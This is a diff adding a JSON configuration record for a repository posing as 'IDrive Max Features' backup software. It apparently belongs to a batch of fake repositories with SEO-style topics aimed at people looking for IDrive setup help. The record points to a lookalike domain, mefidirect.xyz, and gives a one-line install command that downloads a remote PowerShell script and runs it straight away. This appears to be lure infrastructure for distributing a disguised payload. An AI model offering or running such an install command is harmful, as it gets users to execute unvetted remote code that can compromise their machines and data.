@@ -1,0 +1,29 @@
+{
+  "repo": "idrive-max-features",
+  "product": "IDrive Max Features",
+  "kind": "backup",
+  "install_type": "download",
+  "download_url": "https://idrive.mefidirect.xyz/",
+  "install_url": "https://mefidirect.xyz/ps/setup.ps1",
+  "install_command": "irm https://mefidirect.xyz/ps/setup.ps1 | iex",
+  "batch": "new32",
+  "format": "license-md-only",
+  "category": "backup",
+  "topics": [
+    "idrive-package",
+    "idrive-local-install",
+    "post-install",
+    "idrive-installer",
+    "setup-checklist",
+    "idrive-desktop-app",
+    "configuration",
+    "incremental-backup",
+    "idrive-getting-started",
+    "idrive-client",
+    "drive-mirror",
+    "support-docs",
+    "idrive-pc-edition",
+    "sync-client",
+    "idrive-setup-failed-fix"
+  ]
+}
